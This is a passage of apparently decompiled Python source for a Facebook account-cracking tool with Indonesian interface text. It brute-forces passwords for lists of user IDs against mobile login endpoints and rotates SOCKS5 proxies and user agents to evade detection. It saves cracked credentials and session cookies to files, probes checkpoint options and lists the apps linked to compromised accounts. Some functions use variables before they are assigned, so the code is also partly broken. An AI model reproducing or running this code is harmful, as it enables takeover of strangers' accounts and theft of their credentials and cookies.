			koki = ';'.join(['%s=%s' % (key, value) for key, value in p.cookies.get_dict().items()])
			koki += ' m_pixel_ratio=2.625; wd=412x756'
			heade = {'Host': 'p.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://p.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
			if 'checkpoint' in po.cookies.get_dict().keys():
				print('')
				print('')
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m[✓] STATUS		: \x1b[1;96mRR_CP🥀')
				print(f"\x1b[1;91m[✓] USER ID	   : {idf}\n\x1b[1;91m[✓] USER PASSWORD : {pw}")
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER AGENT: ')
				print(f"\r{ua}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('')
				print('')
				open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
				open('RR_CP.txt', 'a').write(idf + '|' + pw + '\n')
				akun.append(idf + '|' + pw)
				cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				ok += 1
				coki = po.cookies.get_dict()
				kuki = ';'.join(['%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
				print('')
				print('')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] STATUS		: \x1b[1;96mRR_OK💚')
				print(f"\x1b[1;92m[✓] USER ID	   : {idf}\n\x1b[1;92m[✓] USER PASSWORD : {pw}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER COOKIES: ')
				print(f"\r{kuki}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER AGENT: ')
				print(f"\r{ua}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('')
				open('RR_OK.txt', 'a').write(idf + '|' + pw + kuki + '\n')
				open('OK/' + okc, 'a').write(idf + '|' + pw + '\n')
				cek_apk(session, coki)
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		loop += 1

def cracktouch(idf, pwv):
	global cp, ok, loop
	bi = random.choice([u, k, kk, b, h, hh])
	pers = loop * 100 / len(id2)
	fff = '%'
	nip = random.choice(prox)
	proxs = {'http': 'socks5://' + nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x))
	sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/','accept-encoding': 'gzip, deflate br','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa = {'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1), 'uid': idf, 'next': 'https://p.facebook.com/login/save-device/', 'flow': 'login_no_pin', 'pass': pw}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr','accept-encoding': 'gzip, deflate br','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'})
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
			koki = ';'.join(['%s=%s' % (key, value) for key, value in p.cookies.get_dict().items()])
			koki += ' m_pixel_ratio=2.625; wd=412x756'
			if 'checkpoint' in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf + '|' + pw)
					ceker(idf, pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'''[•] ID	   : {idf} [•] PASSWORD : {pw}'''
					statuscp1 = nel(statuscp, 'red', **('style',))
					cetak(nel(statuscp1, 'RR CP', **('title',)))
					open('RR_CP.txt', 'a').write(idf + '|' + pw + '\n')
					akun.append(idf + '|' + pw)
					cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				headapp = {
					'user-agent': 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]' }
				if 'no' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('/sdcard/JAHID-KING/OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					print('\n')
					statusok = f'''[•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, 'NAYIM-KING  OK', **('title',)))
					ok += 1
				elif 'ya' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join(['%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('RR_OK.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					user = idf
					infoakun = ''
					session = requests.Session()
					cek2 = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', coki, headapp, **('cookies', 'headers')).text
					cek = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', coki, headapp, **('cookies', 'headers')).text
					infoakun += '\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n'
					apkaktif = re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>', str(cek))
					nok = 1
					for muncul in apkaktif:
						infoakun += f'''[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n'''
						nok += 1
					hit = 0
					infoakun += '\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n'
					apkexp = re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>', str(cek2))
					hit = 0
					for muncul in apkexp:
						hit += 1
						infoakun += f'''[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n'''
					print('\n')
					statusok = f'''[bold green][•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, '[bold green]RR_OK[/bold green]', **('title',)))
					ok += 1
				else:
					continue
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		loop += 1

def crackmbasic(idf, pwv):
	global cp, ok, loop
	bi = random.choice([u, k, kk, b, h, hh])
	pers = loop * 100 / len(id2)
	fff = '%'
	nip = random.choice(prox)
	proxs = {'http': 'socks5://' + nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x))
	sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa = { 'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1), 'uid': idf, 'next': 'https://mbasic.facebook.com/login/save-device/', 'flow': 'login_no_pin', 'pass': pw}
			koki = ';'.join(['%s=%s' % (key, value) for key, value in p.cookies.get_dict().items()])
			koki += ' m_pixel_ratio=2.625; wd=412x756'
			heade = {'connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
			if 'checkpoint' in po.cookies.get_dict().keys() or 'ya' in oprek:
				akun.append(idf + '|' + pw)
				ceker(idf, pw)
				if 'ya' in princp:
					print('\n')
					statuscp = f'''[•] ID	   : {idf} [•] PASSWORD : {pw}'''
					statuscp1 = nel(statuscp, 'red', **('style',))
					cetak(nel(statuscp1, 'RR_CP', **('title',)))
					open('RR_CP.txt', 'a').write(idf + '|' + pw + '\n')
					akun.append(idf + '|' + pw)
					cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				headapp = {'user-agent': 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'}
				if 'no' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('RR_OK.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					print('\n')
					statusok = f'''[•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, 'OK', **('title',)))
					ok += 1
				elif 'ya' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('RR_OK.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					user = idf
					infoakun = ''
					session = requests.Session()
					cek2 = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', coki, headapp, **('cookies', 'headers')).text
					cek = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', coki, headapp, **('cookies', 'headers')).text
					infoakun += '\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n'
					apkaktif = re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>', str(cek))
					nok = 1
					for muncul in apkaktif:
						infoakun += f'''[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n'''
						nok += 1
					hit = 0
					infoakun += '\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n'
					apkexp = re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>', str(cek2))
					hit = 0
					for muncul in apkexp:
						hit += 1
						infoakun += f'''[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n'''
					print('\n')
					statusok = f'''[bold green][•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, '[bold green]RR_OK[/bold green]', **('title',)))
					ok += 1
				else:
					continue
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		loop += 1

def ceker(idf, pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email': idf, 'pass': pw, 'login': 'submit'}, headers=head, allow_redirects=True).text, 'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh', 'jazoest', 'fb_dtsg', 'submit[Continue]', 'checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'): anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com' + str(jo['action']), data, head, **('data', 'headers')).text, 'html.parser')
		print('\r%s++++ %s|%s ----> CP	   %s' % (b, idf, pw, x))
		open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
		cp += 1
		opsi = kent.find_all('option')
		if len(opsi) == 0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)' % (hh, x))
		for opsii in opsi:
			print('\r%s---> %s%s' % (kk, opsii.text, x))
	except Exception as c:
			print('\r%s++++ %s|%s ----> CP	   %s' % (b, idf, pw, x))
			print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s' % (u, x))
			open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
			cp += 1

def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu' % c
	cetak(nel(hu, 'CEK OPSI', **('title',)))
	input(u + '[' + h + '•' + u + '] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id = kes.split('|')[0]
				pw = kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error	  %s' % (b, kes, x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s' % (u, x))
				continue
			bi = random.choice([u, k, kk, b, h, hh])
			print('\r%s---> %s/%s ---> { %s }%s' % (bi, love, len(akun), id, x), ' ', **('end',))
			sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email': id,'pass': pw,'login': 'submit'}, headers=header, allow_redirects=True).text, 'html.parser')
			if 'checkpoint' in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh', 'jazoest', 'fb_dtsg', 'submit[Continue]', 'checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'): anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com' + str(jo['action']), data, header, **('data', 'headers')).text, 'html.parser')
					print('\r%s++++ %s|%s ----> CP	   %s' % (b, id, pw, x))
					opsi = kent.find_all('option')
					if len(opsi) == 0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)' % (hh, x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s' % (kk, opsii.text, x))
				except:
					print('\r%s++++ %s|%s ----> CP	   %s' % (b, id, pw, x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s' % (u, x))
					if 'c_user' in ses.cookies.get_dict().keys():
						print('\r%s++++ %s|%s ----> OK	   %s' % (h, id, pw, x))
					else:
						print('\r%s++++ %s|%s ----> SALAH	   %s' % (x, id, pw, x))
				love += 1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
	
def cek_apk(session, cookie):
	w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', cookies={'cookie': cookie}).text
	sop = BeautifulSoup(w, 'html.parser')
	x = sop.find('form', method='post')
	game = [i.text for i in x.find_all('h3')]
	if len(game) == 0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print('   %s%s. %s%s' % (H, i + 1, game[i].replace('Ditambahkan pada', ' Ditambahkan pada'), N))
	w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', cookies={'cookie': cookie}).text
	sop = BeautifulSoup(w, 'html.parser')
	x = sop.find('form', method='post')
	game = [i.text for i in x.find_all('h3')]
	if len(game) == 0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print('   %s%s. %s%s' % (K, i + 1, game[i].replace('Kedaluwarsa', ' Kedaluwarsa'), N))

if __name__ == '__main__':
	try:
		os.system('git pull')
	except:
		pass
	try:
		os.mkdir('OK')
	except:
		pass
	try:
		os.mkdir('CP')
	except:
		pass
	try:
		os.mkdir('DUMP')
	except:
		pass
	try:
		os.system('touch .prox.txt')
	except:
		pass
	Main()

